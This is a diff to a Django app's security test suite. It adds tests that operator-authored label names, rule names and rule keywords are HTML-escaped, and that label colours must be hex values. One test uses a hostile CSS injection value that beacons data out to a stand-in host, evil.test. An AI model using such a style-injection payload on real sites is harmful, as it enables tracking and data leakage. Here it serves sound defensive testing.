@@ -371,11 +371,19 @@ class TestTheAppCannotBypassEscaping:
 
     def test_no_inbox_template_disables_autoescaping(self) -> None:
         """``|safe`` and ``{% autoescape off %}`` are the template-side versions
-        of the same switch."""
+        of the same switch.
+
+        ``rglob``, not ``glob``. The directory is flat today, and it was flat
+        when this was written — which is exactly how a scan quietly stops
+        covering the thing it was written for: the first person to put a
+        settings page in ``templates/inbox/settings/`` would have taken it out
+        of scope with no test turning red. The Python scan above already walks
+        the package recursively; this now matches it.
+        """
         templates = pathlib.Path(__file__).resolve().parents[3] / "templates" / "inbox"
         offenders = [
-            path.name
-            for path in templates.glob("*.html")
+            str(path.relative_to(templates))
+            for path in templates.rglob("*.html")
             if "|safe" in path.read_text() or "autoescape off" in path.read_text()
         ]
 
@@ -400,3 +408,139 @@ class TestContentSecurityPolicy:
         page = agent_client.get(url_for("thread", conversation_id=conversation.pk)).content.decode()
 
         assert not re.search(r"\son(click|change|submit|load|error)\s*=", page)
+
+
+def services_remove(conversation: Any, label: Any) -> None:
+    """Take a label off, so each pass of the corpus renders exactly one chip."""
+    from apps.inbox.services import remove_label
+
+    remove_label(conversation, label)
+
+
+class TestOperatorAuthoredContent:
+    """Labels, rule names and reminder notes (issue #24).
+
+    A different threat from the rest of this file — these are written by a
+    colleague, not a stranger — but they land on the same page through the same
+    template layer, and SECURITY-BASELINE §2's rule is about the *path*, not
+    about who was at the far end of it. A workspace with a compromised or
+    disgruntled member is exactly the case where "we trust our own users" stops
+    being an argument.
+    """
+
+    def test_a_hostile_label_name_is_escaped_in_the_list(
+        self, agent_client: Any, url_for: Any, conversation: Conversation, inbound: Any
+    ) -> None:
+        from apps.inbox.models import ConversationLabel
+        from apps.inbox.services import apply_label
+
+        inbound(text="hello")
+        # Trimmed to the column, not to taste: `name` is varchar(60), so a
+        # payload longer than that is a DataError rather than a rendering
+        # question, and every injection in the corpus survives the trim with its
+        # dangerous prefix intact.
+        for index, payload in enumerate(INJECTIONS):
+            name = f"{index}{payload}"[:60]
+            label = ConversationLabel.objects.create(workspace=conversation.workspace, name=name)
+            apply_label(conversation, label)
+
+            page = agent_client.get(url_for("rows")).content.decode()
+
+            assert name not in page or escape(name) in page
+            assert "<script>alert" not in page
+            services_remove(conversation, label)
+
+    def test_a_hostile_rule_name_is_escaped_in_the_settings_list(
+        self, tenancy: Any, client_for: Any, url_for: Any
+    ) -> None:
+        from apps.inbox.models import InboxRule
+
+        admin = client_for(tenancy.user_for("admin"))
+        for index, payload in enumerate(INJECTIONS):
+            InboxRule(
+                workspace=tenancy.workspace,
+                name=f"{index}{payload}"[:120],
+                condition_json={"keywords": [{"text": "x", "mode": "contains"}]},
+                actions_json=[{"type": "mark_done"}],
+            ).save()
+
+        page = admin.get(url_for("rule_settings")).content.decode()
+
+        assert "<script>alert" not in page
+        assert escape(INJECTIONS[0]) in page
+
+    def test_a_keyword_is_described_rather_than_dumped_as_json(
+        self, tenancy: Any, client_for: Any, url_for: Any
+    ) -> None:
+        """The rules list prints RuleSummary's sentences, assembled server-side
+        from this workspace's own vocabulary. The stored condition document
+        never reaches the page — printing it raw would be both unvetted and
+        unreadable."""
+        from apps.inbox.models import InboxRule
+
+        InboxRule(
+            workspace=tenancy.workspace,
+            name="Refunds",
+            condition_json={"keywords": [{"text": "<b>refund</b>", "mode": "contains"}]},
+            actions_json=[{"type": "mark_done"}],
+        ).save()
+
+        page = client_for(tenancy.user_for("admin")).get(url_for("rule_settings")).content.decode()
+
+        assert "Message mentions" in page
+        assert "<b>refund</b>" not in page
+        assert escape("<b>refund</b>") in page
+
+
+class TestLabelColours:
+    """A hex reaching an inline ``style`` attribute is the one place in this app
+    where escaping is not enough.
+
+    ``style-src`` carries ``'unsafe-inline'``, and Django's ``escape()`` covers
+    ``& < > " '`` and **not** ``;``, ``:`` or ``(`` — so a colour of
+    ``#fff;background-image:url(https://…)`` would never leave the quotes and
+    would still be a beacon, on a page whose ``img-src`` allows ``https:``.
+    """
+
+    def test_a_colour_that_is_not_a_hex_renders_the_default(self) -> None:
+        from apps.inbox.models import DEFAULT_LABEL_COLOR, ConversationLabel
+        from apps.inbox.rendering import label_chip
+
+        hostile = ConversationLabel(name="Beacon", color="#fff;background-image:url(https://evil.test/?c=")
+
+        assert label_chip(hostile).color == DEFAULT_LABEL_COLOR
+
+    def test_the_model_refuses_it_too(self) -> None:
+        """The write half. Both halves exist because a row can still arrive
+        through a migration, a data import or a shell."""
+        from django.core.exceptions import ValidationError
+
+        from apps.inbox.models import ConversationLabel
+
+        with pytest.raises(ValidationError):
+            ConversationLabel(name="Beacon", color="red; background: url(x)").full_clean()
+
+    def test_no_hostile_colour_reaches_the_rendered_list(
+        self, agent_client: Any, url_for: Any, conversation: Conversation, inbound: Any
+    ) -> None:
+        """End to end, past the validator: written straight onto the row the way
+        a bad migration or a shell would, and still never rendered.
+
+        The stored value is seven characters because the column is
+        ``varchar(7)`` — which is a third guard, and one this assertion
+        deliberately does not lean on: the point is that the *renderer* refuses
+        anything that is not a hex, so widening the column later cannot quietly
+        open this up.
+        """
+        from apps.inbox.models import DEFAULT_LABEL_COLOR, ConversationLabel
+        from apps.inbox.services import apply_label
+
+        inbound(text="hello")
+        label = ConversationLabel.objects.create(workspace=conversation.workspace, name="Beacon")
+        ConversationLabel.objects.for_workspace(conversation.workspace).filter(pk=label.pk).update(color="r;x:(a")
+        apply_label(conversation, label)
+
+        page = agent_client.get(url_for("rows")).content.decode()
+
+        assert "r;x:(a" not in page
+        assert f"--chip-ink: {DEFAULT_LABEL_COLOR};" in page
